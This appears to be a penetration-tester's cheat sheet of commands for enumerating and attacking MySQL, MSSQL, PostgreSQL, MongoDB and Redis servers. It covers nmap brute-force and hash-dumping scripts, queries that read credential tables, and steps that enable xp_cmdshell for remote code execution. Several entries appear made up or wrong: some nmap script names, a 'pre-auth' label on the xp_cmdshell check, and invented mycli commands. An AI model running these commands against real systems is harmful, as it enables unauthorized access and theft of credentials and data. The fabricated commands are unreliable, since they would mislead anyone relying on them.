# Database Enumeration and Exploitation Technique

---

# Database Protocols

```
## 1. MySQL 3306/TCP
## 2. PostgreSQL 5432/TCP
## 3. MSSQL 1433/TCP
## 4. Oracle Database 1521/TCP
## 5. MongoDB 27017/TCP
## 6. Redis 6379/TCP
```

# 1. Nmap

## Identify Current Domain Context

```bash
================================================================= MySQL =================================================================
# Basic version & service detection
nmap -p 3306 --script mysql-info,mysql-variables <target>

# Full MySQL enumeration
nmap -p 3306 --script mysql-* <target>

# User enumeration (valid users)
nmap -p 3306 --script mysql-users --script-args userdb=/path/to/usernames.txt <target>

# Database enumeration
nmap -p 3306 --script mysql-databases --script-args mysqluser='root',mysqlpass='pass' <target>

# Enum tables from specific DB
nmap -p 3306 --script mysql-dump <target> --script-args mysqluser='user',mysqlpass='pass',mysqldb='dbname'

# Brute force (dictionary attack)
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt <target>

# SQL injection testing
nmap -p 3306 --script mysql-sql-injection <target>


================================================================= MSSQL =================================================================
# Basic MSSQL detection & version
nmap -p 1433 --script ms-sql-info <target>

# Full MSSQL enumeration
nmap -p 1433 --script ms-sql-* <target>

# MSSQL user enumeration
nmap -p 1433 --script ms-sql-hasdbaccess,ms-sql-empty-password <target>

# Database enumeration
nmap -p 1433 --script ms-sql-databases,ms-sql-tables <target>

# Brute force login
nmap -p 1433 --script ms-sql-brute --script-args mssqluserdb=users.txt,mssqlpassdb=pass.txt <target>

# XP_CMDSHELL execution check (pre-auth)
nmap -p 1433 --script ms-sql-xp-cmdshell <target>

# Dump hashes (if creds available)
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssqlusername='sa',mssqlpassword='pass' <target>

# Config backup download
nmap -p 1433 --script ms-sql-config <target> --script-args mssqlusername='sa',mssqlpassword='pass'


================================================================= PostgreSQL =================================================================
# Basic PostgreSQL detection
nmap -p 5432 --script postgres-info <target>

# Full PostgreSQL enumeration
nmap -p 5432 --script postgres-* <target>

# User & DB enumeration
nmap -p 5432 --script postgres-users,postgres-databases <target>

# Brute force
nmap -p 5432 --script postgres-brute --script-args userdb=users.txt,passdb=pass.txt <target>

# Version & roles (if auth)
nmap -p 5432 --script postgres-roles --script-args postgresuser='postgres',postgrespass='pass' <target>

# Dump config files
nmap -p 5432 --script postgres-config --script-args postgresuser='postgres',postgrespass='pass' <target>


================================================================= MongoDB =================================================================
# Basic MongoDB detection
nmap -p 27017 --script mongodb-info <target>

# Full MongoDB enumeration
nmap -p 27017 --script mongodb-* <target>

# No-auth access check & database dump
nmap -p 27017 --script mongodb-databases,mongodb-users <target>

# Brute force (if auth enabled)
nmap -p 27017 --script mongodb-brute --script-args mongodbuserdb=users.txt,mongodbpassdb=pass.txt <target>

# Check accessible collections
nmap -p 27017 --script mongodb-databases --script-args mongodbusername='admin',mongodbdatabase='admin' <target>


================================================================= Redis =================================================================
# Basic Redis detection
nmap -p 6379 --script redis-info <target>

# Full Redis enumeration
nmap -p 6379 --script redis-* <target>

# Redis key enumeration (no auth)
nmap -p 6379 --script redis-keyspace,redis-info <target>

# Brute force (if auth enabled)
nmap -p 6379 --script redis-brute --script-args redisuser='default',redispassdb=pass.txt <target>

# Check for RCE via CONFIG (common misconfig)
nmap -p 6379 --script redis-info --script-args redisusername='',redispassword='' <target>


nmap -p 3306,1433,5432,27017,6379 --script "mysql-*","ms-sql-*","postgres-*","mongodb-*","redis-*" <target> \
  --script-args="userdb=/path/to/users.txt,passdb=/path/to/pass.txt"
```

## Login

```bash
# Connect
mysql -h <host> -P 3306 -u <user> -p<pass>

# Basic connections
mysql -u root -p                    # Local root
mysql -h 192.168.1.100 -u admin -p  # Remote

# Enum databases
SHOW DATABASES;
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

# Enum tables
USE <dbname>;
SHOW TABLES;
SELECT table_name FROM information_schema.tables WHERE table_schema = '<dbname>';

# Enum columns
DESCRIBE <table>;
SHOW COLUMNS FROM <table>;
SELECT column_name FROM information_schema.columns WHERE table_name = '<table>';

# Enum users
SELECT user,host FROM mysql.user;
SELECT User,authentication_string FROM mysql.user;

# Dump data
SELECT * FROM <table> LIMIT 10;
SELECT * FROM <table> INTO OUTFILE '/tmp/dump.txt';

# Privilege enum
SHOW GRANTS FOR 'user'@'host';
SELECT * FROM mysql.user WHERE User='<username>';

==================================================================================================================================================================

# Connect syntax
sqlcmd -S <server>,1433 -U <user> -P <pass> -d <database>

# Examples
sqlcmd -S 192.168.1.100 -U sa -P P@ssw0rd
sqlcmd -S localhost -E                 # Windows auth

# Enum databases
SELECT name FROM sys.databases;
SELECT name FROM master..sysdatabases;

# Enum tables
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE';
SELECT name FROM sysobjects WHERE xtype='U';

# Enum columns
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<table>';
sp_columns <table>;

# Enum users
SELECT name FROM sys.server_principals;
SELECT name,password_hash FROM sys.sql_logins;

# Dump data
SELECT TOP 10 * FROM <table>;
xp_cmdshell 'whoami';                  # RCE if enabled

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

==================================================================================================================================================================

# Install: pip install mycli
mycli -h <host> -P 3306 -u <user> -p

# Fuzzy search + syntax highlighting
# Use ↑↓ for history, TAB for autocomplete

# Quick enum aliases (built-in)
.tables                 # Show tables
.fields <table>         # Show columns
.use <db>              # Switch database
.showdb                # Show databases

# Export results
.mycli --csv results.csv

==================================================================================================================================================================

# Connection Properties:
Host: <ip>    Port: 3306/1433
Username: <user>    Password: <pass>
Database: <optional>

# Quick Queries (F5 to execute):
-- MySQL
SHOW DATABASES;
SELECT table_name FROM information_schema.tables;

-- MSSQL  
SELECT name FROM sys.databases;
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

==================================================================================================================================================================



